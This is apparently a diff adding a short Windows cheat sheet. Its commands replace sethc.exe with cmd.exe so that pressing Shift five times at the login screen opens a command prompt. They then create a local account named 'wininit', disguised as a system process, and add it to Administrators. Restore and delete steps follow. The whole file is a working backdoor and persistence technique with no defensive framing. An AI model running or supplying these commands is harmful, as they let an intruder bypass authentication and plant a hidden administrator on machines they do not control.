@@ -1,0 +1,15 @@
+# cd C:\Windows\System32\
+rename sethc.exe sethc.exe.bak
+copy cmd.exe sethc.exe
+# shift 5 times
+
+# In admin cmd
+net users wininit * /add /countrycode:840 /expires:aug,1
+# or try 001 for US, else 0 for default
+net localgroup Administrators wininit /add
+
+# To restore sticky-keys
+copy sethc.exe.bak sethc.exe
+
+# To delete user
+net users wininit /delete
